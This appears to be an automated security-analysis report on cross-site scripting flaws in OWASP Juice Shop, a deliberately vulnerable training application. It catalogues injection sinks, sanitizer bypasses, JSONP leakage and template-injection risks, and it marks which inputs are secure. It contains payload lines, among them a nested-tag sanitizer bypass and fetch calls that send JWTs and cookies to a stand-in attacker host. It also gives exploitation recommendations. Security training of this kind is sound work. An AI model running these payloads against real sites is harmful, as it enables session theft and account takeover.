# Cross-Site Scripting (XSS) Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** Multiple high-confidence XSS vulnerabilities were identified across reflected, stored, and DOM-based categories. All findings have been passed to the exploitation phase via `deliverables/xss_exploitation_queue.json`.
- **Purpose of this Document:** This report provides the strategic context, dominant patterns, and environmental intelligence necessary to effectively exploit the vulnerabilities.

### Summary of Findings
- **Total Vulnerabilities Identified:** 7 exploitable XSS vulnerabilities
- **Vulnerability Types:**
  - **DOM-based XSS:** 1 vulnerability (search parameter)
  - **Stored XSS:** 3 vulnerabilities (feedback, True-Client-IP header, username with CSP injection)
  - **Reflected XSS:** 1 vulnerability (JSONP callback - primarily data leakage)
  - **Hybrid XSS/SSTI:** 2 vulnerabilities (profile rendering with template injection)

### Critical Findings
1. **No Content Security Policy (CSP)** protection across the application
2. **Intentional security bypasses** using Angular's `bypassSecurityTrustHtml()` in 10+ locations
3. **Legacy sanitization functions** vulnerable to double-encoding bypasses
4. **JSONP endpoint** enabling cross-origin data leakage
5. **Server-side template injection** combined with XSS in profile rendering

## 2. Dominant Vulnerability Patterns

### Pattern 1: Angular Security Bypass with bypassSecurityTrustHtml()
- **Description:** A recurring pattern was observed where Angular's `DomSanitizer.bypassSecurityTrustHtml()` is used extensively throughout the frontend, explicitly disabling Angular's built-in XSS protection. This appears in 10+ components.
- **Implication:** Any user-controlled data that flows through these bypassed sanitizers will be rendered as raw HTML, allowing script execution. This is the most pervasive vulnerability pattern in the application.
- **Affected Components:**
  - Search results display (`search-result.component.ts:171`)
  - Feedback administration panel (`administration.component.ts:78`)
  - Last login IP display (`last-login-ip.component.ts:39`)
  - Product descriptions (`search-result.component.ts:145`)
  - About page feedback carousel (`about.component.ts:119-121`)
  - Track order results (`track-result.component.ts:46-48`)
- **Representative Findings:** XSS-VULN-01 (DOM XSS via search), XSS-VULN-02 (Stored XSS in feedback), XSS-VULN-04 (Stored XSS in Last Login IP)

### Pattern 2: Weak Legacy Sanitization Functions
- **Description:** The application uses intentionally weak sanitization functions (`sanitizeHtml()`, `sanitizeLegacy()`) that can be bypassed through double-encoding or nested tag techniques.
- **Implication:** The `sanitize-html` library version 1.4.2 (from 2014) performs only single-pass sanitization, allowing payloads like `<<script>Foo</script>iframe src="javascript:alert(xss)">` to bypass filtering.
- **Code Location:** `/repos/juice-shop/lib/insecurity.ts:60-70`
- **Bypass Technique:** Double-encoding or nested tags - the outer malicious tag is removed, leaving inner XSS payload intact
- **Representative Findings:** XSS-VULN-02 (Feedback bypass), XSS-VULN-06 (Username sanitization bypass)

### Pattern 3: Client-Side URL Parameter Processing
- **Description:** DOM-based XSS where URL parameters are read client-side via Angular's `ActivatedRoute` and rendered directly without server validation.
- **Implication:** Pure client-side data flow from URL to DOM, bypassing any server-side security controls. No server interaction required for exploitation.
- **Attack Flow:** `URL parameter → Angular Router → bypassSecurityTrustHtml() → innerHTML binding → XSS execution`
- **Representative Finding:** XSS-VULN-01 (Search query parameter)

### Pattern 4: JSONP Callback for Cross-Origin Data Leakage
- **Description:** The `/rest/user/whoami` endpoint supports JSONP via a `callback` parameter, allowing authenticated user data to be read cross-origin.
- **Implication:** While Express.js sanitizes the callback parameter (`/[^\[\]\w$.]/g`), preventing traditional XSS, the JSONP mechanism itself bypasses Same-Origin Policy, enabling information disclosure attacks.
- **Attack Vector:** Attacker creates malicious website that includes `<script src="https://victim.com/rest/user/whoami?callback=stealData"></script>` - victim's browser sends cookies, data is exfiltrated
- **Representative Finding:** XSS-VULN-03 (JSONP callback)

### Pattern 5: Server-Side Template Injection Combined with XSS
- **Description:** The user profile page uses Pug template rendering with string replacement before compilation, combined with `eval()` for specific payload patterns.
- **Implication:** Dual vulnerability - SSTI allows RCE on server (`#{code}` pattern triggers `eval()`), while weak sanitization + CSP injection enables XSS in browser
- **Attack Complexity:** Requires multi-step attack chain (CSP bypass via profile image URL + username XSS payload)
- **Representative Findings:** XSS-VULN-05 (SSTI/RCE), XSS-VULN-06 (XSS with CSP bypass)

## 3. Strategic Intelligence for Exploitation

### Content Security Policy (CSP) Analysis
- **Current CSP:** **NONE** - No CSP headers are configured by default
- **Evidence:**
  - No `Content-Security-Policy` header set in Express middleware
  - Helmet's `contentSecurityPolicy()` is never called
  - XSS filter explicitly commented out in `/repos/juice-shop/server.ts:187`
  - No CSP meta tags in `/repos/juice-shop/frontend/src/index.html`
- **Implication:** All inline scripts, `javascript:` protocol URLs, and iframe-based attacks work without restriction
- **Exception:** Profile page (`/profile`) dynamically generates CSP header, but this can be bypassed via CSP injection through the `profileImage` field
- **Recommendation for Exploitation:** Standard XSS payloads work without modification. For profile page, use CSP injection technique documented in XSS-VULN-06.

### Cookie Security
- **Session Cookie:** `token` (JWT)
- **HttpOnly Flag:** ❌ **NOT SET**
- **Secure Flag:** ❌ **NOT SET**
- **SameSite:** ❌ **NOT SET**
- **Storage Locations:**
  - Cookie: `token` (8-hour expiration)
  - localStorage: `token` (primary storage, no expiration)
  - sessionStorage: `bid` (basket ID)
- **Implication:** Session tokens are **fully accessible via JavaScript** through both `document.cookie` and `localStorage.token`
- **Recommendation for Exploitation:** Primary goal should be to steal JWT token via `fetch('https://attacker.com?token=' + localStorage.token)` or `fetch('https://attacker.com?cookie=' + document.cookie)`

### Authentication Token Structure
- **Token Type:** JWT (JSON Web Token)
- **Algorithm:** RS256 (RSA with SHA-256)
- **Expiration:** 6 hours
- **Payload Contains:** Complete user object including:
  - User ID
  - Email address
  - Role (customer/deluxe/accounting/admin)
  - Last login IP (potentially containing XSS payload)
  - Profile image URL
- **Implication:** Stolen JWT provides complete account takeover for 6 hours. Token contains sensitive PII.

### CORS Configuration
- **CORS Middleware:** Enabled via `cors` package
- **Allowed Origins:** Permissive (no strict origin validation observed)
- **JSONP Vulnerability:** The `/rest/user/whoami?callback=` endpoint bypasses CORS entirely, allowing cross-origin authenticated data reads
- **Recommendation for Exploitation:** Use JSONP endpoint for cross-origin attacks; standard XSS for same-origin attacks

### Framework-Specific Context
- **Frontend Framework:** Angular 20.1.0
- **Backend Framework:** Express.js 4.21.0
- **Template Engine:** Pug (formerly Jade) - used for profile page only
- **Security Bypasses:** Angular's `DomSanitizer.bypassSecurityTrustHtml()` is used intentionally to create vulnerabilities for training purposes
- **WebSocket:** Socket.io v3.1.2 on same port (3000) - used for challenge verification, not exploitable for XSS

### Challenge System
All XSS vulnerabilities are tied to specific "challenges" in the Juice Shop CTF system:
- `localXssChallenge` - DOM XSS via search parameter
- `xssBonusChallenge` - SoundCloud iframe payload
- `persistedXssUserChallenge` - Username XSS with CSP bypass
- `persistedXssFeedbackChallenge` - Feedback comment XSS
- `httpHeaderXssChallenge` - True-Client-IP header XSS
- `emailLeakChallenge` - JSONP callback data leakage
- `usernameXssChallenge` - SSTI via #{} pattern

**Implication:** Challenges are enabled/disabled based on environment (`safetyMode` setting). In Docker/Heroku deployments, some challenges may be disabled, activating stronger sanitization.

## 4. Vectors Analyzed and Confirmed Secure

The following input vectors were traced and confirmed to have robust, context-appropriate defenses:

| Source (Parameter/Key) | Endpoint/File Location | Defense Mechanism Implemented | Render Context | Verdict |
|------------------------|------------------------|-------------------------------|----------------|---------|
| `username` (registration) | `POST /api/Users` | Model-level sanitization via setter (`security.sanitizeSecure()`) when challenge disabled | HTML_BODY | SAFE* |
| `email` (registration) | `POST /api/Users` | Model-level sanitization via setter (`security.sanitizeSecure()`) when challenge disabled | HTML_BODY | SAFE* |
| `comment` (feedback with challenge disabled) | `POST /api/Feedbacks` | Recursive sanitization via `sanitizeSecure()` strips all HTML | HTML_BODY | SAFE* |
| Product name/description (admin-created) | `POST /api/Products` | Requires authentication, admin-controlled data only | HTML_BODY | SAFE |
| Challenge descriptions | `/rest/admin/application-configuration` | Server-controlled static data from YAML files | HTML_BODY | SAFE |
| Order IDs | `GET /rest/track-order/:id` | Reflected from database, not from URL parameter directly | HTML_BODY | SAFE |
| Delivery methods | `GET /api/Deliverys` | Server-controlled static data | HTML_BODY | SAFE |
| Captcha content | `GET /rest/captcha`, `GET /rest/image-captcha` | Server-generated, no user input | HTML_BODY | SAFE |

**Note:** Items marked with `*` are conditionally secure - they become vulnerable when the associated challenge is enabled (challenge mode). The recursive `sanitizeSecure()` function provides robust protection by repeatedly applying sanitization until no changes occur.

### Robust Sanitization Pattern
The secure sanitization function (`/repos/juice-shop/lib/insecurity.ts:63-70`):
```typescript
export const sanitizeSecure = (html: string): string => {
  const sanitized = sanitizeHtml(html)
  if (sanitized === html) {
    return html
  } else {
    return sanitizeSecure(sanitized)  // Recursive - prevents double-encoding bypasses
  }
}
```
This recursive approach prevents the double-encoding bypasses that affect the single-pass `sanitizeHtml()` function.

## 5. Analysis Constraints and Blind Spots

### Limitations Encountered

1. **Challenge Mode Dependency**
   - Several vulnerabilities are only active when specific challenges are enabled
   - Challenge enablement varies by deployment environment (local, Docker, Heroku, Gitpod)
   - The `safetyMode` configuration affects which sanitization functions are applied
   - **Impact:** Some findings may not be exploitable in production Docker deployments

2. **Minified Frontend Code**
   - Angular production build creates minified bundles
   - Some DOM XSS vulnerabilities may exist in third-party libraries but were not fully analyzed
   - **Mitigation:** Analysis focused on source TypeScript files rather than compiled JavaScript

3. **Dynamic Content Loading**
   - Angular's lazy loading and dynamic imports mean some components load conditionally
   - Not all code paths may have been traced through dynamic imports
   - **Impact:** Potential XSS sinks in lazily-loaded modules may have been missed

4. **WebSocket Event Handlers**
   - WebSocket messages are processed for challenge verification
   - Limited analysis of WebSocket message handling beyond challenge system
   - **Blind Spot:** Potential XSS in WebSocket message display (e.g., notifications)

5. **Third-Party Dependencies**
   - The application uses 100+ npm packages
   - Analysis focused on application code, not exhaustive third-party library audit
   - **Known Issues:** `sanitize-html` v1.4.2 is outdated (2014), other dependencies may have XSS vulnerabilities

6. **CSP Injection Complexity**
   - The CSP injection vulnerability (XSS-VULN-06) requires multi-step exploitation
   - Testing was performed via code analysis; full end-to-end exploitation not verified in live environment
   - **Mitigation:** Attack chain is well-documented with clear exploitation steps

7. **Server-Side Template Injection (SSTI)**
   - The profile page SSTI vulnerability crosses the boundary between XSS and RCE
   - Full server-side impact assessment (file access, command execution) was not performed
   - **Note:** This is properly an RCE vulnerability, but documented here due to XSS crossover

### Areas Requiring Further Investigation

- **Notification System:** How are WebSocket notifications rendered? Potential XSS sink in notification display
- **File Upload Previews:** SVG file uploads may contain embedded scripts
- **PDF Generation:** Order PDFs are generated with user data - potential for PDF-based XSS
- **Markdown Rendering:** The hacking instructor uses `snarkdown` for markdown - potential injection point
- **Third-Party Widgets:** SoundCloud iframe, Google Analytics, Material Design Lite scripts

### Testing Environment Limitations

- **No Live Browser Testing:** Application was not running; vulnerabilities confirmed via code analysis only
- **Recommendation:** All findings should be verified in live environment with Playwright or manual browser testing before exploitation phase

---

